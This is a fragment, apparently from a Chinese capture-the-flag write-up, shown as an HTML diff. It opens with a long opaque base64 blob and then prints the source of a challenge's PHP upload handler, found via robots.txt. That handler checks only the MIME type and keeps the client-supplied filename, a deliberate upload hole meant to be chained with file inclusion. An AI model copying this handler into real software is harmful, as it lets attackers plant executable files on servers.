Nh6knCDxVAs6xeyaAWvRRI+PqqWBkQ22SO38utMUMAFpv3L8NQ4Du6bLx7KnGilfXgIWW0Ys7E1K65kpCP/2IT585cVbTx/9J5hTZ0hIjIxsUsquaqvhYLHAYF0QdM6a3Ko8Dgc8aBLh8kx8DxppptOyWq5QshISa3j9aKGJiEdK2dOMGQ1EuOmvIob0VpttgiOPEEGk2TRS3DPydjpA/AuNDfKl3iQOFP8PWn73j2d6iwAcnE2dgcsbBgRuyJKWuf14qyWb3GVgupawMwtpLqdDMWczcCOkJbfqpG7OIymKwBPdSL1zunxmGVJFRnyaHnXld4+TEI62GOWdPjPSZH89MNsCyz7RSji0Ch2l/V+nv4zk6IL4P+FAXsmmTSKUpVxYkNcnAMTHkcpwRj7LugOKqWp5Xy0YT4zRWxbpdPjY8pwcwurc6fxoIgwqU+AvDkWbFp5F6JcztKW/cCD0ieaxtcpAfoB7ZCYZxycPz+ufDFN7qJm7/Wa2KBLOEVDdRPNwqLwnR4GD3yuymGUJ/JeppDOCjZ+80oM3pp2I+N7qKaZzhx3fEr/TGWfO62aVN53AJXIYcGZPrT7+Yy403PDEJBJOkn33WyFzO5EVyTZa9sXVYLqh4MoAwmRjGV2FAaKq5ibSyxVmzysQmBJbY/PPfnt+QA70DLmBk3MrpwLABGCvh0nPw5LKXEjkTD6cUiZSCVPYZxYr5dm/rgiFftMh6eUVjPcL9qgTY1SKyrrvVsCp4UhB7nQZHulGR8ZBUHfYAGxaSsMD0IcGwpQ5RgbIm0PlgM4dbsQWagtvioUBrijiHfHobx7q4yr+xDFwcJbKxBT6WjioiAD5xczDWK7YyoOOjaGcMIyBEKKQtOSJxlZMW3eRRPJkdOwwc5iLkBpvO8jjkuF0DX/QS2ewBPKa1kpv7Vpcun4gSwEAi9YEjcs5kL3SIo3ujPHWad0VDN/LbsjvCYsZ6ljT9hXJlErYXeiVQQfEfnBTbUO9dze4kDhNlbooOXu6DBgKHok2k+y3912w2rMvKmPVVEWYQhTqDvXXOkKBrLOgYRExYZH7+fv8A+0Np+MR4nBlaw9rmR4q/+9/l+tU3Hh35scvNVM51Xj2fG5bgmCmgQUIi/MG5ywTZJ6hEKoxA1935naIGaeZZ/snc8bDJOl1ca94j/ywvkq6KVI+baF2rkcaEtIcSyJzw2ZeUEYHl7Mh3fPB+kHokVkXaKbcjeWcdjxbgoWgk2Yt9HmA2FppQT1HxCtjTjsxpKBY6DJA0kcNJ4NjZz2ULYYI1rt1imDMJ2ZKElGQOczUCjSVSAyzcuwIOZ+t6p/0Gno99DE9jQZSSVxkYzlmzF29BOE9W53CxQiwF37aGg94H9eaWbz+wTqFlbZurdMft30wRxsP77bI9jvhBI3jHEU3wJ06CYVBlOKXZzqQlgBH87Z+CJsf1FAV2lvPtNdoIL0vatrf2KgGlTLWsX7/+t3gyVzAyATd+RWEzCtwqvgXvRmZhXAruHgFK4CFSd6nBIQTAUV1zRfikY7A4mBeyaAIMNBTQ8V80t4eIESCjhl48u4JUw1OzZomsYv0TO626AapkWadZLVP3GZCj+O07W6trGp0h3fed3eCJdgPgB5HdJygHkVULnzQHYLvwvlsU0B6gknvwdbPuWBl4Fh5fJuzKmZTtWpHRm++xZC0gmS0K0chyWcQnRgMrEU0TiqgUkzJCgoVa7rWFWNNE/X3BtKuxlIts4WYXfAKHjErR2p7abE7UY7aJGu82V6wflQ6Vg81WVFDbK7XFPuDnCjxWerWsGKtnDfpvvhBKEV4NJ7F+vPhz801YS6o+9qb11QF4i6xiS1wOBrHarcQETjlPp9JRYmlqdGAaq9ROvbvu1jg/K+Lz+uf8aWxUI1uOafr1ZQahINi5bE6GiS4wNBoCRDvWN0sDT/EY2F3SnA5h42gl/ucZHkW2obBkgU1HLJNJRbxMwA8+McOotG9sTIse8KggjFGvOeLeFI+XgR5i9SIBBEOXuV/1yC3OE4Of0e7zhy5/8HG1Zczhvm7tNf8JJwXXxHd3Mx5yIAHaaf3zEL1/GN7gYizwZX+BZzNrPJVB6lXS6qvYuF6G3twdwJ4pn/O30xiv/36MXuT1U4U4VS+emgf0SPB5v7s2Xsm3ko86RwNpljKDGkeqVLoIhGQBMYBlsOBL2NR/EbBo03OZ2cjg2z7KPjxAZvpOtC61ODP6A4uX/bw6ZTGQjnM2ksgazhsAqou1qb06QHnSh8DhCInkXk/SWGxM0kWb30EcfWWm0rdm0eIBAgoolpJqchVhY2uetY36OVJ5e+z3UzRbXagbfSJxWPxTuXKivvoZq8lzKd4qJ2PNVW7w5AAIdDD0nqQnvhx60cArwvBv/G8Swr/3yzI4KT6PwudqtjOqxXTPv+qKwmil9S+bAeYG/n6rdAxQK5IGxCiM2gFNQ0QHuce+m58DlteYQ7iwu22qv/Ew6eECfXjLJ5oIK+QVeld/YJf5jle7u1qxPKOrYaiBqrhzmrnPxg80oZ56Hj4AV/b9U1JIz8qG/e6jp6w27TejjTfrLYAFzjt88PYj3tTLsQhAfw4PiM4JyQmzZcTsHrt4G6RBhStvrPJemsuE4TrGN2nGM4TD1ynDuo3gcfpC4PU5lRk/+wmNNhgBriLbAbtVU0+YM6Vnzyf57nl7LYeJQkw/6PxGYob0vv39GVEe2WGqHMdg5DwcBldn+qHCWnL967BPBJV9wdMKDiVzy/UlwtV26Vt7Ns+/DCMWXkhiUQmXEXZIiJZOPuevfMfmeCRiy3MgCHmYgN4zSRcj2hCwlkiQQOiwcqEH5yEdLj7YEN6XPor/Pp8ikjA+D4O1c6xntLYkkJHKSCuOJF8HAcxQwrHHJelOrxCo8SPShBDdMYE5/nFoVzYt+RdCiHV+sn8SM7X81CqftGcAj6eMF8LhV6nh0HSbhD+aw+HSt8Yn7Z02jdS7DDRfPHcGVokO5VJx+0WoxdHSbiSYGZ166ocLAx9dT7oVfPk3N9yDT96xA0e8elqxBWTlxkZiANgPBKa6G9PHzJoDAm3eULNl3qqhTOzOLOXcvEkNU11oKZqncco/xtDgvyLnZ5uFUSAKf1sChR93F1mVw5JRbwvkcinrN6pFw2ZnuKlP32FfcH7kVXIMjs1JUQwCfJkyXYtz3DCMbzfk7SX85jmOa3UFK0tHZ4FCKpjUuxOXG1pgrhus9JIRuCHfJNof56qRDbaCYOBAjfyOnMukiOLAfkRoMzHqqDbH/De82f42ILIIvlqHNK2bcpgsiZ6/qlWZU5qU55ngQpfaSv3UWCjYyF3t9gWUNRAwNyRRzhrOvKC4N6zl8/Qj4SDLHxf2jCr5BsQ5pDbzjPp2e9czLHfSg+622lA2D57+svQhcbTVVz9hCjkupJMnOdI6WWk7aIHl9palTmR5ak5d2MSHqJ+gkzuZ6Dsa3mMmgR+xaXq9Dt/zmxHMUzoTgDMMlbbePbCNKHRZQwzVNrhHDw4c1q89rUwz7RSG36katGO/PPhXrV6R9+mqKQ50z63Ebh0Hh/GDOUCkapwF55jzLhszsnOQMJ6WX3Po2+Oh5BA0LFmht5r8MiTinsUQw7pGL9CNC6PzizC4LuHw50JWiXWU/1LVRAf3rqQRdE34YK6/LbfRidb0PfM2clRgIZ2i5RbqORYedqhLo/BsietUYDOWsQHSofoyNXYJGHdhfyGMZXUZTFoBPrqvV/G7xh3v4lhpd+CXmMz/iJl5/TrexAujt6iJFd38uuD1gCEV30qneZbebxxYBqb2IsANBWdTFecSV3tGgqOM2A1vBC9bb+GRO+FUjWyDO89Z1jT1IiBs50+jESEs6t5RosQIEqv9RWVxDhPcMBqZD3sXbsG7nTEdwCxnL2tUIOcexjwtI1juRLLiFlFax4bK2md5Zm8/AjWL0Y60SCoXqOGjZe+SKsP2ip5Imcv9XHaEshOA4sSvNTRBV4gJAdlBx0Ltv7BNKQZ3/dbDwt5wnubs2YOTZvg3NsHRTtm2dDhGzqJfkBJ4K3B3invNccUTK8EUzuMF9aajXQ0jDph47E5y6PyzMe/AC39249hbNw0k1B2yOeBB0EjlefDiiLzkiNYX17x0aIyVWY1h75Nbv063NZx3lAa9TpUDmHgpkWB9SlOKegFC3xLaEmCRu9kNQ8Yb0jymZxvKKXm6dmzYUVMxIrb/MlcxFoPO7N7w72jYBTCdTloXWFs3FHFxQBbqMJvgfxzfo2WcEgAAAB4EAAAdNPClk2hsHqLVRIOkGbe1IfGP4O1oKNAor66lI2c+Kkf7XjY6o8GKWbbiKCeICFxQWUgC1sYTj5+jnFVzFYYDgcYXEjUrEVlJoJsw4rBuTyFB4s6S1OKJa4Gk1ivLTvte5exUEDqbTlo/F08g1KupP5dOAbmJpj9zJqm66i/egnj4r1J1VR1RdENY8K4J7tXGjgLNwIQaoNXt7Gn3nm/agxVlzNqaoWeoSaoNZLJjMf5e0XRhaLUhFAdw9NYUmfG3Ugt2rM72LKVB4HNk8o/Pp+MoWEKkPCEhuRGluV+ez9uRXCABEazw3+jD56+W0DcEOi4lq2lth+QL4y254nS5Wu9lkSLxb/pFijEG/H8KfnEdG5txzPpdS8ZjT3FdEHxB1LiNTZ1k5oKcMs2Lby+/kJSjw1fvjxm538bVFRdmowM86NFo0Q2Y1H18zV8nZw4ki/IkvxkcnlibTersaUCVh7e50AGHV5N/xlrTuV5nNqJXq/t4nsJvxQHDKjHul/d62tLOnz4vNt19haoHSfpJqLuUfCHCtpKGYKPFMAaDwtoY56MqRhacEaEzrAh9hu4uMzYv0bMvBpm/wam9z1NXlNrSG/+OUJV0b7yaHNNMkXCbI5YwSUVFh8axdXZvyVYyq4yuPrbJYj1A+6ERxxl9McgjyaJ+cvueZe8535bwCbiax3c8khXpIpCX+Qgj3SwE+8fyHtxSPSqjXpo+Rgs+FYiLi9g+tQVcWDK1sjeYaHslkUeBlz+5i34M9qbBnuL2l7E9GGI43WFkoTq9hDvsSkghoWSfFiaz2X9emDnC6Oug0OHmD9mPMHZhUJ+dQceuv4yIntSvS6a4B8eZ6ftQ58UtxR7Y1jIN+uz7Se01jHBtvHUKoibob59QPpQXfY/8be6hRqswT4xiBsYUowBTcWjLRdVEW2YTmkuIHbWLhJpCRJOP3raHqpPq4bDxb+eK/Po1SVLg6kCSMyLp62Vz+2QPSFGVEw8QuwZgc7PGJy8oEb9NYAhJkNMAfUxCZJV/vk8UYGnVj2ZbBKb8wv6LWJ6SM/DFrN+S1ub8GceUL8Btsklq8veaFe+l+arnVnSTPorqzl427Q6FjPgL6dahRMb7sSBN1Us1V9KC2zZlqrs6qrylYQRME7uuehGxLNrCc8UDTy8vunSrUdwsELEluYquNLY8VCGoEDVLG3v4QDk+il0m44N5bCt9Hs8wZuZRQxs+UDHltmn5R0CJ0Lc+QgWMYMAJxBgcA4zMFZce9XH/e7IR+04CUHi4uiRhNfDXsSivuoA9eR3cr5vSQ4JQ3YxWpBCt13nlaiI1nypYboV8mUyeTE0deYOO0Uy1bwWDsDKGqNDaa6dq/tbkn6yP8d8PL6K2pteUPaOLZcn6WQH33QtdGYakQgoB9bfIVfSmXfQtLpc2EujQJTkOMAqtbiRCeT9SsK2C/LV8gHr8zsxPfPJW26FRi3cqXPQvLvfh8aYsuZcMDnJjzWY/cMVXz2NkmLaGi3UgplhRd67TV9d4ifMY7WHIkDW1EBWFJaVpctTQ13rz3fOB/roFlZg8Iz/AMb6vislz8Y6ShDpfDx1Tbla3se7S85WCLDT95RVEH/cqYqXjh6xzCqwcO27gF/oqbJSmDXWeO8GmvE7rYdaX7jEHQrH67iSklH/D0yBn/bB5vzeTUd07lx+Maj2YWThGsrw+v418SuwejPGCBTSRO3Mhd30oJuYz2Vbq3ASt7oqjFiBMpWNZ9Go7DZCUiPeuybduMNhI6dlSQqcy1C43/dWzOHsIllo2XTHT1HnNTgFdqAjTGJ1CFNPI0mvpNpIfVJMVD5UVmwUz1DietFq1w79iid/PciSwaZQURdclYOHvnCGF+Qc8UF7arB+9hH9W0/N4kMouTYcY3sYSrC7Zo4DZYg/OyBh0PNJg7ctQxvVo8mmT8fo4EcREnkDn24nKCWjN19YqBZDE17DYBG5TkkWdyFT3YwFdHClRlfgdPFrheV1Ptm/cM6rW2yLVcSuVdoqXIzC1igbeFF8EUC4IGO2yido0GLP7/5VoPbz36gkLg5Ezj8rabWX4ZsZfXRDTGZ33J0caXD8SYUsnWowBHZl+KKHsuGYZfD62466QxYJFxDz/T+7C1oHsPc767WAC+0lGP3fqBJGMd0sIGhIDiMRKhmq2A2AZSBOpE06AlKOskJI99GLfFlkyoTMFuBduUqv0154Lf56LcIPAvYpZ/W2869F3UdFUS7hzt7Rya1xh5SBZ1CBAB8GA8Z5bIIizQzvlw2Loe2kHxw9uq0+VsyP5QDcBEf3xKukTtpPyQjQT4ar7IbM5JKrj4IRyuIIDy42fb63PR72CCG0Dr8DU42qOqQShz8d4/5wXbGqc/q/OrkPokwkG1nQrjh0/mEKrTDK1QjFxM6rMVSgBL0V/ZiinK7shVOKo2CdpFduKT4onH7S2vwS9QB15oTkdHEAyvd8SDRYa4nPrlX3mk4HB2ByXNfX+hi3vGt6G8/mOC5Zuy+aKpgGKV660bQtzO6Ptyny33qtJ4Du/W85hNgaQks0pThyLF86It/I97KPRcTdyNM9Ja9u359cCWCDm41HU1mtsvu1JSX2HxY5naHF79e4wK/J+47JvvDHq5psnDekfcKMm7G9IvQ1SBsp1AhOdLj13nRvZq36d8iIvgLFYpXOtY8y/jXVT4CcipnNj+CF1BVNcgwlBAlrWQpPtOtzYeq4YYgRdPcCYQ2J0MXw46qVQvcPrMwkArkj9zVfCTC7kHx8+SOUGk/bovXayqmmgOJEs9fODb4iag/ss+jchSG/s4ZYZt+gbg2ecsFUStkUtpRSmNkCNK0QHrxJbk9kG/BKoPJPk5uE7cqPmY1XJiGrO/DnFxjxo+0TUufUk51byC+pewwKqoCsceOx9YW861fx+HP/IDKoSkxZdMRW/tAaQnBbAG1YNeEEejtwG/QLvY3SNnaUnrjHHjlbQyijDviIA81lRs6L/kIpg0UedNdfi+RN4Bs0LcvlSaBfzhs7U9oEenc4bkAF0VOlUyaU0wcog9dzRyu0VPEblg2QyrMPgi5OfeeiP1R17h8hk2xD8bwhRxSbDsx+zZ1pdnDbLvx7x7rsTLad1GLGxmBuurI+crgYRAPVINcSasBWhEDrrbUzsu6h7WAv9CgP81Oca7fQmeLV/B4sNTEThx6SAE+mbdgvYNGs2AuBtZxoDnEQPK+11WQ62yO9dImKRanrIGJdCWh8HJoPJUgzORY9Hq3LCEaNTADx8QvhKQyVO3Vj/UeXuSMQDqdP6VGnzT6ylQ4IlJfIav3TRLA+rnaiGiUfZoTe0puVHYsSwOblRJ3YKvdpaF0lQKJRwpeXobw+2DikW+L+ubv4Sqj2cRjn7SuvGio2ga3CWXpEoQSwJEWs9g71HHWmM5virKAoecGBbPIjG+bfQAXDzQVT6NROFr0/Ol1WZRtKWez8lDKUBEebDz1+xmmAejw/eTKusmblMxBoucvK/CNHnu8osGJOknhGht7KVHu5wNbLyVH9K9l7E2Ng1WHFkoMCniRMDqjpond9q16gTgquWv+RDoU/0qaf6UBWuyZUThgLp3rTblGYH2sIrPQxhk1L3W5R+lAzuP/qLyH1498tfONQkk1CFGeqTtdZj6IDWjTF6pKZj8xF+k/HSdHsbIfPBM9o/4fE3zjRtysSQsDFImgUBQQnlOLx/q4wDNClnWO4gxGD7dS9SVN6sJrURfkLxDrGqf+2KtZS/HUlyq8zs1GgIfwcZ0Z90oPE2iZtL8IyW21z1D9rEkQeNiOitPcZSxDh+oOiJNbkqvDW2VPimBDIrYscxXZ/2LhIvmRKzBbznmmmR+S9PSukCzD4jSp8qqxZzyaHMwXvaLUJ6b0rm1wHcNp2lBfbi280fVlGc7daqoQCkKFaSdlJw76YqbpQywoQS+QaACcP4BlvoBtax5p4vIl/U4Pbvo0Vow1OlD5AGslY2rha1uEt5iIDFgQ0MPyczB/8YsPNoEzLdQmCXAMQMB/iRXx8pZdlOaISP0aFW0AaqEsVwDiQKI+2cJn9MZ+GHO0fRPs/ASgFq+kCuHC6Bt8D9RuwnfhQhET2uWCBitAWPs6Tk+hg4UbC2e8rKCmPQv3i8+wgMQMxHRJ6yx2u1jLOaErNKDOTNyRm+INGXuYoWNk2TVNdAJOeIemSmHhMTL/I50OtYeaSnetFfOy5HKQ+sDjP8YOBvHs++W/nDjveVbHsI9cWlcvMOJ1ixC7jCMBAEIn5Ab5A9y6KNTi6KdWgJGYr5nsJc8FDjWo5eEtq71jn8K9UaUvbMdHLBzsph2b+T7CWvg+DkaQLta2n8Tb+ztdkDeBoBrxd9wRyPQsxIUcraMMv/JBeW+cXkwD/cdXKV5IsK7V/n2vFiOiH09XY3jCISSRhQYvegv9yn7CShylE4e79Vv86M5i+PIl8KUDkVl/RFWmAJ8CKY7vh/eswyWeXZnuBta8n3s/MgXuMbtoC1kBv5HumP6izS9UzocSy2iAX8idavTvwAtJnFGkMblg8aJFE1d3+z6LC+NEEh8eedDBbU0a7UpVu00Zm2ii1gO44qiPDJkduCsC/UaOMrbZ8eUFqeMKaZ/Xhdk1yNC7oy/tBFpunchW29xRl4Us9Z4RuKxm1/jP615a//ed6GZ/Knn057IU6dc77dI5DWtuL77foVV7z4IOrNSg00h4/uGi8DrRxRugFHvHHqv42HKI0pAZhhrRS7qtiMO82DQEiClmDdyOJ5tznFVJTYmWoR6yk2VvlJ2D77GAmIvn1VxdP7VIQa+A97ppIJgJneHaoOEcrIwa1QfkwzIcsZ4zyRRWHOqke8GHHRcoNHywCnu1cbHhRxsXUn0SUGVQP0Q+HqxaWZy0VTQhVq7erkr81XLkanlyGmbFqf8wgObMHQKbfRdo0EIyyfBU+7ac2oZgEWo0QktgMlQbX/DUApj0DvSEMFqlahvEkti/JF4JOVGPLk12+G3b3dNji2kNFezybky1jhWR91AoTBhfds+XXvxDKC5Dk7HV8rP9356Wm49A4XCENGxYvgYNqdQupXscu0haZijGbnNfkBka/dzlvLUAHh0piw8tTu2B1tzANUnlZSDSprsUjT98aGSN4Xz/iwDO1LcOXJFJz1iw62DkbW5iIAn992qy7AR04Jgg7JvVezLLPKFYMcTmTO28BTRahinK6z1FWo0H3yVznqkeFDv3k8y9QrePyCl9bfhhHeXLNTkes5Vx6Yxl7eBlgv292SpdGY3CBzzNrZTTNqiQ6/srgOfetEIiOPGkwUgy8FrFVlPtbPkaM57YZS19fQ6Hz2QGjSWyx9rkEzJryNnVIo0PEv7bs+oq2XzhqDohkfUkoxrypieC4ZCOOndR5v/9yrsXFNQxJXVJIZrpaylH00AWg94QNPRHSHwfBFpOYeSsaNGOdNGgjEEIakK2jcRVFOx7xOZVpjzt0uzbiICQ4m3nhLBBdVevcn4NsO4ADQCg+wZLcrVxOsmeRebEuUG1NHgM6YDpOvSZ3YD/sXFrj3Qg7IQ5+XvcrtrvHUHW7yATbQ8qZpbG56Q0FLEBD9HqiLuorcDsqfVG2iU//NLl9Hh8BwjQHcLfQOZ9nSeuSKrMFO6u06gAAAAA=&apos;);
 </code></pre><p>9&#x3001;&#x518D;&#x6765;&#x770B;&#x770B;&#x654F;&#x611F;&#x6587;&#x4EF6;&#xFF0C;robots.txt &#x6709;&#x5185;&#x5BB9;&#x3002;</p>
 <p><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/1555861868d25a4beff2c8d27a2a7f6f0eb92b11b5-1024x130.png" alt=""></p>
 <p>10&#x3001;&#x6709;&#x4E1C;&#x897F;&#xFF0C;&#x6253;&#x5F00;&#x770B;&#x770B;&#x3002;/?route=app/Up10aD&#x3002;</p>
 <p><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/15558619138761b515d42a5a78e66d7f415b903650-1024x239.png" alt=""></p>
 <p>&#x83B7;&#x53D6;&#x4E0B;&#x6E90;&#x7801;&#x3002;</p>
-<p>app/Up10aD.php &#x7684;&#x6E90;&#x7801;&#xFF1A;</p>
-<pre class="language-"><code><span class="token prolog">&lt;?php
-if (!defined(&apos;LFI&apos;)) {
-    echo &quot;Include me!&quot;;
-    exit();
-}
+<pre class="language-"><code>app/Up10aD.php &#x7684;&#x6E90;&#x7801;&#xFF1A;
 
-if (isset($_FILES[&quot;file&quot;])) {
-    $filename = $_FILES[&quot;file&quot;][&quot;name&quot;];
-    $fileext = &quot;.gif&quot;;
-    switch ($_FILES[&quot;file&quot;][&quot;type&quot;]) {
-        case &apos;image/gif&apos;:
-            $fileext = &quot;.gif&quot;;
-            break;
-        case &apos;image/jpeg&apos;:
-            $fileext = &quot;.jpg&quot;;
-            break;
-        default:
-            echo &quot;Only gif/jpg allowed&quot;;
-            exit();
+    <span class="token prolog">&lt;?php
+    if (!defined(&apos;LFI&apos;)) {
+        echo &quot;Include me!&quot;;
+        exit();
     }
-    $dst = &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . $fileext;
-    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $dst);
-    echo &quot;&#x6587;&#x4EF6;&#x4FDD;&#x5B58;&#x4F4D;&#x7F6E;: {$dst}&lt;br /&gt;&quot;;
-}
-?&gt;</span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
 
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>UTF-8<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
+    if (isset($_FILES[&quot;file&quot;])) {
+        $filename = $_FILES[&quot;file&quot;][&quot;name&quot;];
+        $fileext = &quot;.gif&quot;;
+        switch ($_FILES[&quot;file&quot;][&quot;type&quot;]) {
+            case &apos;image/gif&apos;:
+                $fileext = &quot;.gif&quot;;
+                break;
+            case &apos;image/jpeg&apos;:
+                $fileext = &quot;.jpg&quot;;
+                break;
+            default:
+                echo &quot;Only gif/jpg allowed&quot;;
+                exit();
+        }
+        $dst = &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . $fileext;
+        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $dst);
+        echo &quot;&#x6587;&#x4EF6;&#x4FDD;&#x5B58;&#x4F4D;&#x7F6E;: {$dst}&lt;br /&gt;&quot;;
+    }
+    ?&gt;</span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
 
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
-    &#x6211;&#x4EEC;&#x4E0D;&#x80FD;&#x8BA9;&#x9009;&#x624B;&#x8F7B;&#x800C;&#x6613;&#x4E3E;&#x7684;&#x641C;&#x7D22;&#x5230;&#x4E0A;&#x4F20;&#x63A5;&#x53E3;&#x3002;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span>
-    &#x5373;&#x4FBF;&#x662F;&#x8FD0;&#x6C14;&#x597D;&#x7684;&#x4EBA;&#x78B0;&#x5DE7;&#x9047;&#x5230;&#x4E86;&#xFF0C;&#x6211;&#x76F8;&#x4FE1;&#x6211;&#x4EEC;&#x7684;&#x8FC7;&#x6EE4;&#x662F;&#x4E07;&#x65E0;&#x4E00;&#x5931;&#x7684;(&#x624D;&#x602A;
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>post<span class="token punctuation">&quot;</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>multipart/form-data<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
-        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>file<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>&#x6765;&#x9009;&#x62E9;&#x4F60;&#x7684;&#x6587;&#x4EF6;&#x5427;:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>
-        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>file<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>file<span class="token punctuation">&quot;</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>file<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
-        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span>
-        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>Submit<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>UTF-8<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
 
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
+        &#x6211;&#x4EEC;&#x4E0D;&#x80FD;&#x8BA9;&#x9009;&#x624B;&#x8F7B;&#x800C;&#x6613;&#x4E3E;&#x7684;&#x641C;&#x7D22;&#x5230;&#x4E0A;&#x4F20;&#x63A5;&#x53E3;&#x3002;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span>
+        &#x5373;&#x4FBF;&#x662F;&#x8FD0;&#x6C14;&#x597D;&#x7684;&#x4EBA;&#x78B0;&#x5DE7;&#x9047;&#x5230;&#x4E86;&#xFF0C;&#x6211;&#x76F8;&#x4FE1;&#x6211;&#x4EEC;&#x7684;&#x8FC7;&#x6EE4;&#x662F;&#x4E07;&#x65E0;&#x4E00;&#x5931;&#x7684;(&#x624D;&#x602A;
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>post<span class="token punctuation">&quot;</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>multipart/form-data<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>file<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>&#x6765;&#x9009;&#x62E9;&#x4F60;&#x7684;&#x6587;&#x4EF6;&#x5427;:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>file<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>file<span class="token punctuation">&quot;</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>file<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>Submit<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
 
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
+
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
